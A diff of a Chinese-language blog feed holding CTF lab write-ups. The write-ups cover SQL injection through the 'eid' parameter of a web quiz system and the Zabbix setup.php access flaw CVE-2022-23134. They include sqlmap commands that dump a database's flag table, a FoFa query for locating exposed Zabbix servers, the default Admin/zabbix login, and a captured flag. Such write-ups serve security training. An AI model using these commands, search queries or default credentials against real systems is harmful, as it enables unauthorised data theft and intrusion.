+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该CMS的welcome.php中存在SQL注入攻击。</p><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><code>/welcome.php</code></p><p><a href="/assets/img/image-1.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-1.png" alt="Alt text"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>注册登录</p><p>在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。S<br><a href="/assets/img/image-2.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-2.png" alt="Alt text"></a><br>存在SQL注入漏洞，可以通过<code>eid</code>参数进行注入。</p><p>查询数据库</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch --dbs</code></p><p>指定数据库的表</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch -D &quot;ctf&quot; --tables</code></p><p>指定表的列<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; --columns</code></p><p>指定列的数据<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</code></p><p><a href="/assets/img/image-3.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-3.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
       
       
       <categories>
@@ -2052,11 +2094,11 @@
     
     
     <entry>
-      <title>CVE-2022-32991</title>
-      <link href="/2024/11/13/2024-02-20-CVE-2022-32991/"/>
-      <url>/2024/11/13/2024-02-20-CVE-2022-32991/</url>
+      <title>CVE-2022-23134</title>
+      <link href="/2024/11/13/2024-02-19-CVE-2022-23134/"/>
+      <url>/2024/11/13/2024-02-19-CVE-2022-23134/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>该CMS的welcome.php中存在SQL注入攻击。</p><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><code>/welcome.php</code></p><p><a href="/assets/img/image-1.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-1.png" alt="Alt text"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>注册登录</p><p>在welcome.php，发现基于 Web 的测验系统 v1.0 通过 eid 参数包含一个 SQL 注入漏洞。S<br><a href="/assets/img/image-2.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-2.png" alt="Alt text"></a><br>存在SQL注入漏洞，可以通过<code>eid</code>参数进行注入。</p><p>查询数据库</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch --dbs</code></p><p>指定数据库的表</p><p><code>python sqlmap.py -u &quot;http://eci-2ze4tsdmyu2zp7bj7frb.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; -p &quot;eid&quot; --batch -D &quot;ctf&quot; --tables</code></p><p>指定表的列<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; --columns</code></p><p>指定列的数据<br><code>--batch -D &quot;ctf&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</code></p><p><a href="/assets/img/image-3.png" title="Alt text" class="gallery-item"><img src="/assets/img/image-3.png" alt="Alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2022-23134"><a href="#CVE-2022-23134" class="headerlink" title="CVE-2022-23134"></a>CVE-2022-23134</h2><ol><li>描述</li></ol><p>Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p><ol start="2"><li>分析<br><a href="https://img2.imgtp.com/2024/03/02/gXvwQ71v.png" title="1709358782253.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/gXvwQ71v.png" alt="1709358782253.png"></a></li></ol><h2 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h2><p><code>Title=&quot;Zabbix&quot; &amp;&amp; body=&quot;Zabbix SIA&quot;</code></p><p>弱口令：<code>Admin/zabbix</code></p><p><a href="https://img2.imgtp.com/2024/03/02/LifiuzlA.png" title="1709359619020.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/LifiuzlA.png" alt="1709359619020.png"></a></p><p><a href="https://img2.imgtp.com/2024/03/02/CF8WaglB.png" title="1709359666403.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/CF8WaglB.png" alt="1709359666403.png"></a></p><p><a href="https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png" title="1709359728362.png" class="gallery-item"><img src="https://img2.imgtp.com/2024/03/02/1eU7V7Ae.png" alt="1709359728362.png"></a></p><p>flag{3669658d-5ca3-47d7-943c-3d985df13fab}</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
       
       
       <categories>
